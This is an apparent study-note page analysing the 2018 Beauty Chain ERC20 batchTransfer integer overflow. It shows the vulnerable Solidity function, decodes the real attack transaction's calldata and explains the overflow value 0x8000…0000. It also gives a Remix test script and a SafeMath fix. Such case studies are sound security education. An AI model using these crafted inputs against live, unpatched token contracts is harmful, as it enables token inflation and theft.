<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Real-World-Scenario: ERC20 Beauty Chain Batch Overflow 2018 </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Real-World-Scenario: ERC20 Beauty Chain Batch Overflow 2018 </h1><br/><strong>This is a hyperinflation attack happened in 2018</strong><br /><br />A bunch of erc20 tokens incorrectly checked the results of mathematical calculations. This lack of safe checks led to exchanges freezing all erc20 token transfers. <br />The effected tokens in this attack used an insecure batch send function that was not protected from integer overflows. <br />This vulnerability was copy pasted into many different tokens and when exploited it forced exchanges to suspend all erc20 token transfers until the issue was resolved.<br /><br />Vulnerable function in the contract: <a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a><br />    <div class="codebox"><pre>function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (<span style="color:#7f0044;font-weight:400">bool</span>) {<br />    uint cnt = _receivers.length;<br />    uint256 amount = uint256(cnt) * _value;      <span style="color:#0088ff;font-weight:400">//&lt;-- overflow vulnerability</span><br />    require(cnt &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; cnt &lt;= <span style="color:#ff0044;font-weight:400">20</span>);<br />    require(_value &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);<br />    balances[msg.sender] = balances[msg.sender].sub(amount);<br />    <span style="color:#ff9d00;font-weight:700">for</span> (uint i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; cnt; i++) {<br />        balances[_receivers[i]] = balances[_receivers[i]].add(_value);<br />        Transfer(msg.sender, _receivers[i], _value);<br />    }<br />    <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">true</span>;<br />}</pre></div><br />   ◇ The issue with this function is it’s performing a <code><span style="text-decoration:underline;">balances[msg.sender]</span></code><span style="text-decoration:underline;"> check against the </span><code><span style="text-decoration:underline;">amount</span></code><span style="text-decoration:underline;"> on line 5</span> but <span style="text-decoration:underline;">that </span><code><span style="text-decoration:underline;">amount</span></code><span style="text-decoration:underline;"> value comes from a mathematical operation on line 3 which has an overflow vulnerability</span>.<br />   ◇ In fact the <code>amount</code> results come from multiplying the length of the array(<code>_receivers.length</code>) times the <code>_value</code> that is sent to each receiver. Since <span style="text-decoration:underline;">there are no checks that this mathematical operation does not overflow to a value lower than our balance</span>, we can easily set the amount to 0 using a very large number as our <code>_value</code>.<br />   ◇ When the actual balances(<code>balances[_receivers[i]]</code> ) are updated on line 8, we are not using the amount of 0, but instead we are using the initial large <code>_value</code> sent to the function, but this time there is no multiplication, so it does not cause an overflow, it only updates the balances of the receivers to a very large number. <br /><br /><strong><span style="color:#ff0000;">Real Attack Transaction</span></strong><br />View the transaction on etherscan: <a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a><br />    click to see more → input data<br />    <a href=""><img src="images/1410-1.png" alt="images/1410-1.png" /></a><br />    <div class="codebox"><pre>Function: batchTransfer(address[] _receivers, uint256 _value)<br /><br />MethodID: <span style="color:#ff0044;font-weight:400">0x83f12fec</span><br />[<span style="color:#ff0044;font-weight:400">0</span>]:  <span style="color:#ff0044;font-weight:400">0000000000000000000000000000000000000000000000000000000000000040</span>  <span style="color:#0088ff;font-weight:400">//define that the array with its length start at position 0x40 = 64 bytes -&gt; [2]</span><br />[<span style="color:#ff0044;font-weight:400">1</span>]:  <span style="color:#ff0044;font-weight:400">8000000000000000000000000000000000000000000000000000000000000000</span>  <span style="color:#0088ff;font-weight:400">//_value that we want to pass</span><br />[<span style="color:#ff0044;font-weight:400">2</span>]:  <span style="color:#ff0044;font-weight:400">0000000000000000000000000000000000000000000000000000000000000002</span>  <span style="color:#0088ff;font-weight:400">//length of the array</span><br />[<span style="color:#ff0044;font-weight:400">3</span>]:  000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033  <span style="color:#0088ff;font-weight:400">//receivers address 1 of the array</span><br />[<span style="color:#ff0044;font-weight:400">4</span>]:  0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7  <span style="color:#0088ff;font-weight:400">//receivers address 2 of the array</span></pre></div><br />The data in the transaction can be broken down as the following<br />   ◇ <span style="text-decoration:underline;">MethodID</span> of 4 Byte (0x83f12fec)<br />      This value (0x83f12fec) come from by hashing the function “batchTransfer(address[],uint256)” with keccak-256. Note that the function to hash is without the variable names and spaces of the original one.<br />      It is the fist 4 byte of the hexadecimal value created (0x + 4 Byte), considering that each 2 digits of a hexadeciaml number is 1 Byte. <br />     We can calculate it by:<br />         - node commands on Linux(<a href="https://stackoverflow.com/questions/52664899/solidity-and-web3-sha3-methods-return-something-else">web3.utils.sha3 is an alias for keccak-256</a>):<br />             <div class="codebox"><pre>root@kali:/# npm install web3<br />root@kali:/# node<br />&gt; <span style="color:#7f0044;font-weight:400">const</span> web3 = require(&#39;web3&#39;)<br />&gt; web3.utils.sha3(<span style="color:#3ad900;font-weight:400">&quot;batchTransfer(address[],uint256)&quot;</span>).substring(<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff0044;font-weight:400">10</span>)</pre></div><br />            <a href=""><img src="images/1410-2.png" alt="images/1410-2.png" /></a><br />         - use an <a href="https://emn178.github.io/online-tools/keccak_256.html">online Tool</a> and then take the first 4 Bytes(8 digits)<br />   ◇ <span style="text-decoration:underline;">Five 32-byte values</span> (0,1,2,3,4)<br />   When we have an array in a function, we have to pass to it <br />      ▪ [0] Offset to the <code>_recievers</code> Array, point to the 64th (0x40) Byte [2]. If you look at the 64th byte, it is the beginning of our array. The first 32 bytes [2] is the length (0x02), followed by the two addresses on line [3] and [4]<br />      ▪ [1] This is the actual <code>_value</code> which is being sent that when multiplied causes an overflow. (A very large number)<br />      ▪ [2] This is the size of the <code>_recievers</code> array sent to batch transfer in this case 2 addresses (0x02)<br />      ▪ [3] This is the first address from the <code>_recievers</code> array used in the batch transfer.<br />      ▪ [4] This is the second address from the <code>_recievers</code> array used in the batch transfer.<br /><br /><strong>Why is been chosen </strong><strong><span style="color:#ff0000;">0x8000000000000000000000000000000000000000000000000000000000000000</span></strong><strong>  as </strong><strong><code>_value</code></strong><strong> ?</strong><br />Because as we have seen <a href="Home--Blockchain_and_Smart_Contracts_Exploitation--Solidity--2._State_Variables_&_Integers.html">here</a> uint256 need to a value strictly &lt; 0x10000000000000000000000000000000000000000000000000000000000000000 otherwise it goin overflow.<br />To reach this value, we cannot insert directly this number because it would give us directly an error of “value out-of-bounds”. <br />To test the overflow, we can use this small script in the IDE <a href="http://remix.ethereum.org/">http://remix.ethereum.org/</a><br />    <div class="codebox"><pre>pragma solidity ^0.6.6;<br />  <br />contract noAuth {<br />    function amount(uint256 myAmount) <span style="color:#ff9d00;font-weight:700">public</span> returns(uint){<br />        <span style="color:#ff9d00;font-weight:700">return</span> myAmount * <span style="color:#ff0044;font-weight:400">2</span>;     <span style="color:#0088ff;font-weight:400">//or *4 like in the other example below</span><br />    }  <br />}</pre></div><br />• With an array of length 2, we can use 1/2 of the value so <span style="color:#ff0000;">0x8000000000000000000000000000000000000000000000000000000000000000</span><br />    <a href=""><img src="images/1410-3.png" alt="images/1410-3.png" /></a><br />    <a href=""><img src="images/1410-4.png" alt="images/1410-4.png" /></a><br />• With an array of length 4, we can use 1/4 of the value so 0x4000000000000000000000000000000000000000000000000000000000000000<br />    <a href=""><img src="images/1410-5.png" alt="images/1410-5.png" /></a><br />    <a href=""><img src="images/1410-6.png" alt="images/1410-6.png" /></a><br />  <br /><br /><strong><h3>Fix the vulnerability</h3></strong><br />For older versions of solidity (<a href="https://soliditydeveloper.com/solidity-0.8#:~:text=Integrated%20SafeMath">&lt;0.8</a>) we need to use the <a href="https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol">SafeMath library</a>.<br />In the subchapter (<a href="ws--Transfer_Function_Vulnerable_to_a_Batch_Overflow--Real-World-Scenario_ERC20_Beauty_Chain_Batch_Overflow_2018--Test_locally_the_Attack.html">Test locally the Attack</a>), we have tested and fixed the vulnerability locally, Check it!<br /><div class="codebox"><pre>pragma solidity 0.6.6;<br />import <span style="color:#3ad900;font-weight:400">&quot;https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol&quot;</span>;</pre></div><br /><br /><div class="codebox"><pre>function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (<span style="color:#7f0044;font-weight:400">bool</span>) {<br />    uint cnt = _receivers.length;<br />    uint256 amount = SafeMath.mul(uint256(cnt), _value);  <span style="color:#0088ff;font-weight:400">//&lt;--</span><br />    require(cnt &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; cnt &lt;= <span style="color:#ff0044;font-weight:400">20</span>);<br />    require(_value &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);<br />    balances[msg.sender] = SafeMath.sub(balances[msg.sender],  amount);  <span style="color:#0088ff;font-weight:400">//&lt;--</span><br />    <span style="color:#ff9d00;font-weight:700">for</span> (uint i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; cnt; i++) {<br />        balances[_receivers[i]] = SafeMath.add(balances[_receivers[i]],  _value);  <span style="color:#0088ff;font-weight:400">//&lt;--</span><br />        Transfer(msg.sender, _receivers[i], _value);<br />    }<br />    <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">true</span>;<br />}</pre></div><br /><br />                                                                       <br /><br /><br /><br />Bibliography:<br />• <a href="http://console-cowboys.blogspot.com/2020/08/smart-contract-hacking-chapter-3.html">http://console-cowboys.blogspot.com/2020/08/smart-contract-hacking-chapter-3.html</a></div>
</body>
</html>
